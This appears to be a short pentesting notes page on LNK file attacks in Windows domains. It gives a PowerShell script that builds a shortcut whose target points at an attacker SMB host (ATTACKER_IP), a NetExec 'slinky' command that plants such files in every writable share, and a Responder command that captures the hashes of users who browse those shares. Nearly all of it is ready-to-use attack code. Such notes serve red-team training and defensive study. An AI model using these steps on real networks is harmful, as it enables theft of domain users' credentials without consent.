# LNK File Attacks

The logic under this attacks is to create a link file connected to a attacker's SMB server. Putting this file to a shared directory into a domain (for example inside a DC) , when a user access to it, the file trying to connect with attacker's SMB server sending the user credentials.



## Craft the file

### Powershell craft

Open powershell with Administrator privilege and create this file connected to out kali machine.

```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\@test.lnk") # use @ to put the file in top
$lnk.TargetPath = "\\ATTACKER_IP\@test.png" # TOCHANGE IP
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

Once we have this file, we have to put it in some shared directories.

### NetExec craft

Another way to craft this file is using `slinky` module of `NetExec` tool.

This module **will create a LNK file** with connection to our machine and **will try to add it to any shared directory** with WRITE permissions.

{% code title="NetExec" overflow="wrap" %}
```bash
netexec smb $DC_IP -d $DOMAIN -u $USER -p $PASS -M slinky -o NAME=test SERVER=$ATTACKER_IP
```
{% endcode %}



## Set Responder

Now, setting the responder tool to capture the credentials.

```bash
sudo responder -I eth0 -dP
```



Then, when anyone make access to the Shared Directory, the LNK file will send the credentials to out Responder.

<figure><img src="../../../.gitbook/assets/image (271).png" alt=""><figcaption><p>Shared Directory</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption><p>Captured hash with responder</p></figcaption></figure>

